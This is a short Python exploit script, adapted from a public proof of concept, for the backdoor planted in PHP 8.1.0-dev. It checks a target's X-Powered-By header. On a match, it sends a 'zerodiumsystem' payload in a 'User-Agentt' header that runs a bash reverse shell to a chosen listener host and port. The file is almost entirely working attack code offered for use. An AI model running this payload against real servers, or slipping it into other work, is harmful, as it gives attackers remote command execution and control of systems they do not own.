import urllib
import urllib.request
# Adapted from 
# Exploit Title: PHP 8.1.0-dev Backdoor Remote Code Execution
# Date: 23 may 2021
# Exploit Author: flast101
# Vendor Homepage: https://www.php.net/
# Software Link:
#     - https://hub.docker.com/r/phpdaily/php
#     - https://github.com/phpdaily/php
# Version: 8.1.0-dev
# Tested on: Ubuntu 20.04
# CVE : N/A
# References:
#     - https://github.com/php/php-src/commit/2b0f239b211c7544ebc7a4cd2c977a5b7a11ed8a
#     - https://github.com/vulhub/vulhub/blob/master/php/8.1-backdoor/README.zh-cn.md


# options: ('host': str, 'lhost': str,
# 'lport': int, 'cmd': bool, header: dict)
def flast(options: tuple):
    request = urllib.request.urlopen(options[0])
    if request.status == 200:
        if options[3]:
            for response_header in request.getheaders():
                if response_header[0] == 'X-Powered-By:' and response_header[1] == "PHP/8.1.0-dev":  
                    remoto = f'bash -c \"bash -i >& /dev/tcp/{options[1]}/{options[2]} 0>&1\"'
                    header = {"User-Agentt": f"zerodiumsystem({remoto});"}
                    shell = urllib.request.Request(options[0], headers=header)
                    if urllib.request.urlopen(shell):
                        return True